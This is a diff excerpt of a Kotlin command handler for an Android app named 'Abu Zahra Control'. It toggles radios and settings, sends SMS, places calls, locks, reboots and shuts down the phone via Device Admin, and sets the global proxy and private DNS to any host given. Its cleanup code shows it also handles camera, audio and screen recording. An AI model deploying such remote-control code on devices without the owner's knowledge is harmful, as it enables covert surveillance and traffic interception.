+   798→                // Set as default ringtone
+   799→                Settings.System.putString(context.contentResolver, Settings.System.RINGTONE, ringtoneUri.toString())
+   800→                // Preview the ringtone briefly
+   801→                val player = android.media.MediaPlayer.create(context, ringtoneUri)
+   802→                player?.setAudioAttributes(
+   803→                    AudioAttributes.Builder()
+   804→                        .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
+   805→                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+   806→                        .build()
+   807→                )
+   808→                player?.setOnCompletionListener { mp -> mp.release() }
+   809→                player?.start()
+   810→                Thread { Thread.sleep(5000); try { player?.stop(); player?.release() } catch (_: Exception) {} }.start()
+   811→                "Ringtone set and previewing"
+   812→            } else {
+   813→                "Failed to load ringtone from URI: $arg - ensure it points to a valid audio file"
+   814→            }
+   815→        } catch (e: SecurityException) {
+   816→            "Error: Permission denied - WRITE_SETTINGS required: ${e.message}"
+   817→        } catch (e: Exception) {
+   818→            Log.e(TAG, "Set ringtone error", e)
+   819→            "Error: ${e.message}"
+   820→        }
+   821→    }
+   822→
+   823→    // ===== WIFI CONTROL =====
+   824→    fun enableWifi(context: Context): String {
+   825→        return try {
+   826→            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+   827→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   828→                context.startActivity(Intent(Settings.Panel.ACTION_WIFI).apply {
+   829→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   830→                })
+   831→                "Opening WiFi settings panel"
+   832→            } else {
+   833→                @Suppress("DEPRECATION")
+   834→                wm.isWifiEnabled = true
+   835→                "WiFi enabled"
+   836→            }
+   837→        } catch (e: Exception) {
+   838→            Log.e(TAG, "Enable WiFi error", e)
+   839→            "Error: ${e.message}"
+   840→        }
+   841→    }
+   842→
+   843→    fun disableWifi(context: Context): String {
+   844→        return try {
+   845→            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+   846→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   847→                context.startActivity(Intent(Settings.Panel.ACTION_WIFI).apply {
+   848→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   849→                })
+   850→                "Opening WiFi settings panel"
+   851→            } else {
+   852→                @Suppress("DEPRECATION")
+   853→                wm.isWifiEnabled = false
+   854→                "WiFi disabled"
+   855→            }
+   856→        } catch (e: Exception) {
+   857→            Log.e(TAG, "Disable WiFi error", e)
+   858→            "Error: ${e.message}"
+   859→        }
+   860→    }
+   861→
+   862→    // ===== BLUETOOTH CONTROL =====
+   863→    fun enableBluetooth(context: Context): String {
+   864→        return try {
+   865→            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
+   866→            if (adapter == null) {
+   867→                return "Bluetooth not available on this device"
+   868→            }
+   869→            if (!adapter.isEnabled) {
+   870→                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+   871→                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) 
+   872→                        != PackageManager.PERMISSION_GRANTED) {
+   873→                        return "BLUETOOTH_CONNECT permission required"
+   874→                    }
+   875→                }
+   876→                adapter.enable()
+   877→                "Bluetooth enabling..."
+   878→            } else {
+   879→                "Bluetooth already enabled"
+   880→            }
+   881→        } catch (e: Exception) {
+   882→            Log.e(TAG, "Enable Bluetooth error", e)
+   883→            "Error: ${e.message}"
+   884→        }
+   885→    }
+   886→
+   887→    fun disableBluetooth(context: Context): String {
+   888→        return try {
+   889→            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
+   890→            if (adapter == null) {
+   891→                return "Bluetooth not available on this device"
+   892→            }
+   893→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+   894→                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) 
+   895→                    != PackageManager.PERMISSION_GRANTED) {
+   896→                    return "BLUETOOTH_CONNECT permission required"
+   897→                }
+   898→            }
+   899→            adapter.disable()
+   900→            "Bluetooth disabled"
+   901→        } catch (e: Exception) {
+   902→            Log.e(TAG, "Disable Bluetooth error", e)
+   903→            "Error: ${e.message}"
+   904→        }
+   905→    }
+   906→
+   907→    // ===== MOBILE DATA =====
+   908→    fun enableMobileData(context: Context): String {
+   909→        return try {
+   910→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   911→                context.startActivity(Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY).apply {
+   912→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   913→                })
+   914→                "Opening network settings panel"
+   915→            } else {
+   916→                "Mobile data control requires system privileges on newer Android"
+   917→            }
+   918→        } catch (e: Exception) {
+   919→            Log.e(TAG, "Enable mobile data error", e)
+   920→            "Error: ${e.message}"
+   921→        }
+   922→    }
+   923→
+   924→    fun disableMobileData(context: Context): String {
+   925→        return try {
+   926→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   927→                context.startActivity(Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY).apply {
+   928→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   929→                })
+   930→                "Opening mobile data settings (direct toggle requires system privileges on Android 10+)"
+   931→            } else {
+   932→                "Mobile data control requires system privileges on newer Android"
+   933→            }
+   934→        } catch (e: Exception) {
+   935→            Log.e(TAG, "Disable mobile data error", e)
+   936→            "Opening mobile data settings (direct toggle requires system privileges on Android 10+)"
+   937→        }
+   938→    }
+   939→
+   940→    // ===== HOTSPOT =====
+   941→    fun enableHotspot(context: Context): String {
+   942→        return try {
+   943→            // Try WifiManager.setWifiApEnabled via reflection (requires system/root)
+   944→            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+   945→            val method = wm.javaClass.getDeclaredMethod("setWifiApEnabled", android.net.wifi.WifiConfiguration::class.java, Boolean::class.javaPrimitiveType)
+   946→            method.isAccessible = true
+   947→            method.invoke(wm, null, true)
+   948→            "Hotspot enabled via reflection"
+   949→        } catch (e: Exception) {
+   950→            Log.w(TAG, "Hotspot reflection failed: ${e.message}")
+   951→            try {
+   952→                context.startActivity(Intent(Settings.ACTION_WIRELESS_SETTINGS).apply {
+   953→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   954→                })
+   955→                "Hotspot control requires WRITE_SETTINGS and system-level WiFi AP API (only available with root or system app privileges). Opening WiFi settings."
+   956→            } catch (e2: Exception) {
+   957→                Log.e(TAG, "Enable hotspot error", e2)
+   958→                "Error: ${e2.message}"
+   959→            }
+   960→        }
+   961→    }
+   962→
+   963→    fun disableHotspot(context: Context): String {
+   964→        return try {
+   965→            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+   966→            val method = wm.javaClass.getDeclaredMethod("setWifiApEnabled", android.net.wifi.WifiConfiguration::class.java, Boolean::class.javaPrimitiveType)
+   967→            method.isAccessible = true
+   968→            method.invoke(wm, null, false)
+   969→            "Hotspot disabled via reflection"
+   970→        } catch (e: Exception) {
+   971→            Log.w(TAG, "Hotspot disable reflection failed: ${e.message}")
+   972→            try {
+   973→                context.startActivity(Intent(Settings.ACTION_WIRELESS_SETTINGS).apply {
+   974→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+   975→                })
+   976→                "Hotspot control requires WRITE_SETTINGS and system-level WiFi AP API (only available with root or system app privileges). Opening WiFi settings."
+   977→            } catch (e2: Exception) {
+   978→                Log.e(TAG, "Disable hotspot error", e2)
+   979→                "Error: ${e2.message}"
+   980→            }
+   981→        }
+   982→    }
+   983→
+   984→    // ===== AIRPLANE MODE =====
+   985→    fun airplaneOn(context: Context): String {
+   986→        return try {
+   987→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+   988→                // Requires WRITE_SECURE_SETTINGS - system app only
+   989→                Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 1)
+   990→                val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
+   991→                intent.putExtra("state", true)
+   992→                intent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY)
+   993→                context.sendBroadcast(intent)
+   994→                "Airplane mode ON (requires system app for full functionality)"
+   995→            } else {
+   996→                @Suppress("DEPRECATION")
+   997→                Settings.System.putInt(context.contentResolver, Settings.System.AIRPLANE_MODE_ON, 1)
+   998→                "Airplane mode ON"
+   999→            }
+  1000→        } catch (e: Exception) {
+  1001→            Log.e(TAG, "Airplane on error", e)
+  1002→            "Error: ${e.message} - Airplane mode control requires system privileges"
+  1003→        }
+  1004→    }
+  1005→
+  1006→    fun airplaneOff(context: Context): String {
+  1007→        return try {
+  1008→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+  1009→                Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0)
+  1010→                val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
+  1011→                intent.putExtra("state", false)
+  1012→                intent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY)
+  1013→                context.sendBroadcast(intent)
+  1014→                "Airplane mode OFF (requires system app for full functionality)"
+  1015→            } else {
+  1016→                @Suppress("DEPRECATION")
+  1017→                Settings.System.putInt(context.contentResolver, Settings.System.AIRPLANE_MODE_ON, 0)
+  1018→                "Airplane mode OFF"
+  1019→            }
+  1020→        } catch (e: Exception) {
+  1021→            Log.e(TAG, "Airplane off error", e)
+  1022→            "Error: ${e.message} - Airplane mode control requires system privileges"
+  1023→        }
+  1024→    }
+  1025→
+  1026→    // ===== AUTO ROTATE =====
+  1027→    fun setAutoRotate(context: Context, params: Map<String, Any>): String {
+  1028→        return try {
+  1029→            val arg = params["arg"]?.toString()?.lowercase() ?: "on"
+  1030→            val enabled = arg == "on" || arg == "true" || arg == "1"
+  1031→            
+  1032→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+  1033→                Settings.System.putInt(
+  1034→                    context.contentResolver, 
+  1035→                    Settings.System.ACCELEROMETER_ROTATION,
+  1036→                    if (enabled) 1 else 0
+  1037→                )
+  1038→            }
+  1039→            "Auto rotate ${if (enabled) "ON" else "OFF"}"
+  1040→        } catch (e: Exception) {
+  1041→            Log.e(TAG, "Set auto rotate error", e)
+  1042→            "Error: ${e.message}"
+  1043→        }
+  1044→    }
+  1045→
+  1046→    // ===== OPEN URL =====
+  1047→    fun openUrl(context: Context, params: Map<String, Any>): String {
+  1048→        val url = params["arg"]?.toString() ?: ""
+  1049→        return if (url.isNotBlank()) {
+  1050→            try {
+  1051→                var finalUrl = url
+  1052→                if (!url.startsWith("http://") && !url.startsWith("https://")) {
+  1053→                    finalUrl = "https://$url"
+  1054→                }
+  1055→                context.startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(finalUrl)).apply {
+  1056→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+  1057→                })
+  1058→                "Opened: $finalUrl"
+  1059→            } catch (e: Exception) {
+  1060→                Log.e(TAG, "Open URL error", e)
+  1061→                "Error opening URL: ${e.message}"
+  1062→            }
+  1063→        } else "No URL provided"
+  1064→    }
+  1065→
+  1066→    // ===== SEND SMS =====
+  1067→    fun sendSms(context: Context, params: Map<String, Any>): String {
+  1068→        val arg = params["arg"]?.toString() ?: ""
+  1069→        return if (arg.isNotBlank()) {
+  1070→            try {
+  1071→                val parts = arg.split(" ", limit = 2)
+  1072→                val number = parts.getOrNull(0) ?: ""
+  1073→                val message = parts.getOrNull(1) ?: ""
+  1074→                
+  1075→                if (number.isBlank() || message.isBlank()) {
+  1076→                    return "Usage: number message"
+  1077→                }
+  1078→                
+  1079→                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) 
+  1080→                    != PackageManager.PERMISSION_GRANTED) {
+  1081→                    return "SEND_SMS permission not granted"
+  1082→                }
+  1083→                
+  1084→                val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+  1085→                    context.getSystemService(SmsManager::class.java)
+  1086→                } else {
+  1087→                    @Suppress("DEPRECATION")
+  1088→                    SmsManager.getDefault()
+  1089→                }
+  1090→                
+  1091→                smsManager.sendTextMessage(number, null, message, null, null)
+  1092→                "SMS sent to $number"
+  1093→            } catch (e: Exception) {
+  1094→                Log.e(TAG, "Send SMS error", e)
+  1095→                "Error: ${e.message}"
+  1096→            }
+  1097→        } else "Usage: number message"
+  1098→    }
+  1099→
+  1100→    // ===== MAKE CALL =====
+  1101→    fun makeCall(context: Context, params: Map<String, Any>): String {
+  1102→        val number = params["arg"]?.toString() ?: ""
+  1103→        return if (number.isNotBlank()) {
+  1104→            try {
+  1105→                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) 
+  1106→                    != PackageManager.PERMISSION_GRANTED) {
+  1107→                    return "CALL_PHONE permission not granted"
+  1108→                }
+  1109→                
+  1110→                context.startActivity(Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number")).apply {
+  1111→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+  1112→                })
+  1113→                "Calling $number..."
+  1114→            } catch (e: SecurityException) {
+  1115→                "CALL_PHONE permission denied"
+  1116→            } catch (e: Exception) {
+  1117→                Log.e(TAG, "Make call error", e)
+  1118→                "Error: ${e.message}"
+  1119→            }
+  1120→        } else "No number provided"
+  1121→    }
+  1122→
+  1123→    // ===== SPEAK TEXT =====
+  1124→    fun speakText(context: Context, params: Map<String, Any>): String {
+  1125→        val text = params["arg"]?.toString() ?: ""
+  1126→        return if (text.isNotBlank()) {
+  1127→            try {
+  1128→                val tts = arrayOfNulls<android.speech.tts.TextToSpeech>(1)
+  1129→                val latch = CountDownLatch(1)
+  1130→                
+  1131→                tts[0] = android.speech.tts.TextToSpeech(context) { status ->
+  1132→                    if (status == android.speech.tts.TextToSpeech.SUCCESS) {
+  1133→                        tts[0]?.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "tts_${System.currentTimeMillis()}")
+  1134→                    }
+  1135→                    latch.countDown()
+  1136→                }
+  1137→                
+  1138→                "Speaking: $text"
+  1139→            } catch (e: Exception) {
+  1140→                Log.e(TAG, "Speak text error", e)
+  1141→                "Error: ${e.message}"
+  1142→            }
+  1143→        } else "No text provided"
+  1144→    }
+  1145→
+  1146→    // ===== SHOW NOTIFICATION =====
+  1147→    fun showNotification(context: Context, params: Map<String, Any>): String {
+  1148→        val title = params["title"]?.toString() ?: params["arg"]?.toString() ?: "Notification"
+  1149→        val message = params["message"]?.toString() ?: ""
+  1150→        
+  1151→        return try {
+  1152→            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+  1153→            
+  1154→            // Create channel for Android O+
+  1155→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+  1156→                val channel = NotificationChannel(
+  1157→                    NOTIFICATION_CHANNEL_ID,
+  1158→                    "Abu Zahra Control",
+  1159→                    NotificationManager.IMPORTANCE_HIGH
+  1160→                )
+  1161→                nm.createNotificationChannel(channel)
+  1162→            }
+  1163→            
+  1164→            val notification = NotificationCompat.Builder(context, NOTIFICATION_CHANNEL_ID)
+  1165→                .setSmallIcon(R.mipmap.ic_launcher)
+  1166→                .setContentTitle(title)
+  1167→                .setContentText(message)
+  1168→                .setPriority(NotificationCompat.PRIORITY_HIGH)
+  1169→                .setAutoCancel(true)
+  1170→                .build()
+  1171→            
+  1172→            nm.notify(System.currentTimeMillis().toInt(), notification)
+  1173→            "Notification shown: $title"
+  1174→        } catch (e: Exception) {
+  1175→            Log.e(TAG, "Show notification error", e)
+  1176→            "Error: ${e.message}"
+  1177→        }
+  1178→    }
+  1179→
+  1180→    // ===== LOCK PHONE =====
+  1181→    fun lockPhone(context: Context): String {
+  1182→        return try {
+  1183→            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+  1184→            
+  1185→            // Try Device Admin first
+  1186→            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+  1187→            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
+  1188→            
+  1189→            if (dpm.isAdminActive(adminComponent)) {
+  1190→                dpm.lockNow()
+  1191→                return "Phone locked"
+  1192→            }
+  1193→            
+  1194→            // Fallback: try accessibility service
+  1195→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+  1196→                val accessibility = MyAccessibilityService.getInstance()
+  1197→                if (accessibility != null) {
+  1198→                    accessibility.lockScreen()
+  1199→                    return "Phone locked via accessibility"
+  1200→                }
+  1201→            }
+  1202→            
+  1203→            // Wake then lock
+  1204→            @Suppress("DEPRECATION")
+  1205→            val wakeLockFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+  1206→                android.os.PowerManager.PARTIAL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
+  1207→            } else {
+  1208→                @Suppress("DEPRECATION")
+  1209→                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
+  1210→            }
+  1211→            val wl = pm.newWakeLock(wakeLockFlags, "abuzahra:lock")
+  1212→            wl.acquire(100)
+  1213→            wl.release()
+  1214→            
+  1215→            "Phone lock requires Device Admin or Accessibility service"
+  1216→        } catch (e: Exception) {
+  1217→            Log.e(TAG, "Lock phone error", e)
+  1218→            "Error: ${e.message} - Device Admin may not be active"
+  1219→        }
+  1220→    }
+  1221→
+  1222→    // ===== REBOOT =====
+  1223→    fun reboot(context: Context): String {
+  1224→        return try {
+  1225→            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+  1226→            
+  1227→            // Try Device Admin
+  1228→            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+  1229→            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
+  1230→            
+  1231→            if (dpm.isAdminActive(adminComponent)) {
+  1232→                pm.reboot("abuzahra_reboot")
+  1233→                return "Rebooting..."
+  1234→            }
+  1235→            
+  1236→            "Reboot requires Device Admin permission"
+  1237→        } catch (e: Exception) {
+  1238→            Log.e(TAG, "Reboot error", e)
+  1239→            "Error: ${e.message} - REBOOT permission required"
+  1240→        }
+  1241→    }
+  1242→
+  1243→    // ===== SHUTDOWN =====
+  1244→    fun shutdown(context: Context): String {
+  1245→        return try {
+  1246→            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+  1247→            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+  1248→            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
+  1249→            
+  1250→            if (dpm.isAdminActive(adminComponent)) {
+  1251→                // Use reflection for shutdown
+  1252→                val clazz = Class.forName("android.os.PowerManager")
+  1253→                val method = clazz.getMethod("shutdown", Boolean::class.javaPrimitiveType, String::class.java, Boolean::class.javaPrimitiveType)
+  1254→                method.invoke(pm, false, "abuzahra", true)
+  1255→                return "Shutting down..."
+  1256→            }
+  1257→            
+  1258→            "Shutdown requires Device Admin permission"
+  1259→        } catch (e: Exception) {
+  1260→            Log.e(TAG, "Shutdown error", e)
+  1261→            "Error: ${e.message} - SHUTDOWN permission required"
+  1262→        }
+  1263→    }
+  1264→
+  1265→    // ===== PLAY SOUND =====
+  1266→    fun playSound(context: Context, params: Map<String, Any>): String {
+  1267→        return try {
+  1268→            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+  1269→            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
+  1270→            
+  1271→            val soundUri = when (params["sound"]?.toString()) {
+  1272→                "alarm" -> Settings.System.DEFAULT_ALARM_ALERT_URI
+  1273→                "notification" -> Settings.System.DEFAULT_NOTIFICATION_URI
+  1274→                else -> Settings.System.DEFAULT_RINGTONE_URI
+  1275→            }
+  1276→            
+  1277→            val player = android.media.MediaPlayer.create(context, soundUri)
+  1278→            player?.setOnCompletionListener { it.release() }
+  1279→            player?.start()
+  1280→            "Sound played"
+  1281→        } catch (e: Exception) {
+  1282→            Log.e(TAG, "Play sound error", e)
+  1283→            "Error: ${e.message}"
+  1284→        }
+  1285→    }
+  1286→
+  1287→    // ===== LANGUAGE =====
+  1288→    fun setLanguage(context: Context, params: Map<String, Any>): String {
+  1289→        val lang = params["arg"]?.toString() ?: ""
+  1290→        return if (lang.isNotBlank()) {
+  1291→            try {
+  1292→                val locale = Locale(lang)
+  1293→                Locale.setDefault(locale)
+  1294→                
+  1295→                val config = context.resources.configuration
+  1296→                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+  1297→                    config.setLocale(locale)
+  1298→                } else {
+  1299→                    @Suppress("DEPRECATION")
+  1300→                    config.locale = locale
+  1301→                }
+  1302→                
+  1303→                context.resources.updateConfiguration(config, context.resources.displayMetrics)
+  1304→                "Language changed to $lang (requires app restart)"
+  1305→            } catch (e: Exception) {
+  1306→                "Error: ${e.message}"
+  1307→            }
+  1308→        } else "No language specified"
+  1309→    }
+  1310→
+  1311→    // ===== TIMEZONE =====
+  1312→    fun setTimezone(context: Context, params: Map<String, Any>): String {
+  1313→        val tz = params["arg"]?.toString() ?: ""
+  1314→        return try {
+  1315→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+  1316→                context.startActivity(Intent(Settings.ACTION_DATE_SETTINGS).apply {
+  1317→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+  1318→                })
+  1319→                "Opening date settings"
+  1320→            } else {
+  1321→                val alarm = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+  1322→                @Suppress("DEPRECATION")
+  1323→                alarm.setTimeZone(tz)
+  1324→                "Timezone set to $tz"
+  1325→            }
+  1326→        } catch (e: Exception) {
+  1327→            Log.e(TAG, "Set timezone error", e)
+  1328→            "Error: ${e.message}"
+  1329→        }
+  1330→    }
+  1331→
+  1332→    // ===== ALARM / TIMER / REMINDER =====
+  1333→    fun setAlarm(context: Context, params: Map<String, Any>): String {
+  1334→        val arg = params["arg"]?.toString() ?: ""
+  1335→        return if (arg.isNotBlank()) {
+  1336→            try {
+  1337→                val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+  1338→                val time = arg.toLongOrNull() ?: (System.currentTimeMillis() + 60000)
+  1339→                
+  1340→                val intent = Intent("android.provider.AlarmClock.ACTION_SET_ALARM").apply {
+  1341→                    putExtra("EXTRA_HOUR", 0)
+  1342→                    putExtra("EXTRA_MINUTES", 1)
+  1343→                }
+  1344→                
+  1345→                context.startActivity(intent)
+  1346→                "Alarm set: $arg"
+  1347→            } catch (e: Exception) {
+  1348→                Log.e(TAG, "Set alarm error", e)
+  1349→                "Error: ${e.message}"
+  1350→            }
+  1351→        } else "No alarm time provided"
+  1352→    }
+  1353→
+  1354→    // ===== NFC =====
+  1355→    fun nfcOn(context: Context): String {
+  1356→        return try {
+  1357→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+  1358→                context.startActivity(Intent(Settings.Panel.ACTION_NFC).apply {
+  1359→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+  1360→                })
+  1361→                "Opening NFC settings"
+  1362→            } else {
+  1363→                "NFC control requires WRITE_SETTINGS or system privileges"
+  1364→            }
+  1365→        } catch (e: Exception) {
+  1366→            Log.e(TAG, "NFC on error", e)
+  1367→            "Error: ${e.message}"
+  1368→        }
+  1369→    }
+  1370→    
+  1371→    fun nfcOff(context: Context): String {
+  1372→        return try {
+  1373→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+  1374→                context.startActivity(Intent(Settings.Panel.ACTION_NFC).apply {
+  1375→                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+  1376→                })
+  1377→                "Opening NFC settings to disable"
+  1378→            } else {
+  1379→                "NFC control requires WRITE_SETTINGS or system privileges"
+  1380→            }
+  1381→        } catch (e: Exception) {
+  1382→            Log.e(TAG, "NFC off error", e)
+  1383→            "Error: ${e.message}"
+  1384→        }
+  1385→    }
+  1386→
+  1387→    // ===== DNS CHANGE =====
+  1388→    fun dnsChange(context: Context, params: Map<String, Any>): String {
+  1389→        val dns = params["arg"]?.toString() ?: params["dns"]?.toString() ?: ""
+  1390→        if (dns.isBlank()) return "No DNS server address provided (e.g., 8.8.8.8)"
+  1391→        return try {
+  1392→            // Try setting via Settings.Global (requires WRITE_SECURE_SETTINGS for system app)
+  1393→            Settings.Global.putString(context.contentResolver, "private_dns_server", dns)
+  1394→            "DNS set to $dns via Settings.Global (may require system app or root for full effect; VPN-based DNS is recommended)"
+  1395→        } catch (e: SecurityException) {
+  1396→            "DNS change failed: WRITE_SECURE_SETTINGS permission required. VPN-based DNS override is recommended as an alternative."
+  1397→        } catch (e: Exception) {
+  1398→            Log.e(TAG, "DNS change error", e)
+  1399→            "DNS change requires VPN service implementation for reliable results. Error: ${e.message}"
+  1400→        }
+  1401→    }
+  1402→
+  1403→    // ===== PROXY =====
+  1404→    fun proxySet(context: Context, params: Map<String, Any>): String {
+  1405→        val arg = params["arg"]?.toString() ?: ""
+  1406→        if (arg.isBlank()) {
+  1407→            // Clear proxy if no arg
+  1408→            return try {
+  1409→                Settings.Global.putString(context.contentResolver, "global_http_proxy_host", null as String?)
+  1410→                Settings.Global.putInt(context.contentResolver, "global_http_proxy_port", 0)
+  1411→                Settings.Global.putString(context.contentResolver, "global_http_proxy_exclusion_list", null as String?)
+  1412→                "Proxy cleared"
+  1413→            } catch (e: Exception) {
+  1414→                "Error clearing proxy: ${e.message}"
+  1415→            }
+  1416→        }
+  1417→        return try {
+  1418→            val parts = arg.split(":")
+  1419→            val host = parts.getOrNull(0) ?: ""
+  1420→            val port = parts.getOrNull(1)?.toIntOrNull() ?: 8080
+  1421→
+  1422→            Settings.Global.putString(context.contentResolver, "global_http_proxy_host", host)
+  1423→            Settings.Global.putInt(context.contentResolver, "global_http_proxy_port", port)
+  1424→            Log.d(TAG, "Proxy set to $host:$port via Settings.Global")
+  1425→            "Proxy set to $host:$port via Settings.Global (requires WRITE_SECURE_SETTINGS for system-wide effect)"
+  1426→        } catch (e: SecurityException) {
+  1427→            "Proxy set failed: WRITE_SECURE_SETTINGS required. System app or root needed for global proxy. Error: ${e.message}"
+  1428→        } catch (e: Exception) {
+  1429→            Log.e(TAG, "Proxy set error", e)
+  1430→            "Error: ${e.message}"
+  1431→        }
+  1432→    }
+  1433→    
+  1434→    // ===== CLEANUP =====
+  1435→    fun cleanup() {
+  1436→        try {
+  1437→            cameraDevice?.close()
+  1438→            cameraSession?.close()
+  1439→            imageReader?.close()
+  1440→            cameraThread?.quitSafely()
+  1441→            
+  1442→            if (isRecordingAudio) {
+  1443→                mediaRecorder?.stop()
+  1444→                mediaRecorder?.release()
+  1445→            }
+  1446→            
+  1447→            if (isRecordingScreen) {
+  1448→                screenRecorder?.stop()
+  1449→                screenRecorder?.release()
+  1450→                virtualDisplay?.release()
+  1451→                mediaProjection?.stop()
+  1452→            }
+  1453→            
+  1454→            screenImageReader?.close()
+  1455→        } catch (e: Exception) {
+  1456→            Log.w(TAG, "Cleanup error", e)
+  1457→        }
+  1458→        
+  1459→        cameraDevice = null
+  1460→        cameraSession = null
+  1461→        imageReader = null
+  1462→        cameraThread = null
+  1463→        mediaRecorder = null
+  1464→        screenRecorder = null
+  1465→        virtualDisplay = null
+  1466→        mediaProjection = null
+  1467→        screenImageReader = null
+  1468→        isRecordingAudio = false
+  1469→        isRecordingScreen = false
+  1470→    }
+  1471→}
+  1472→
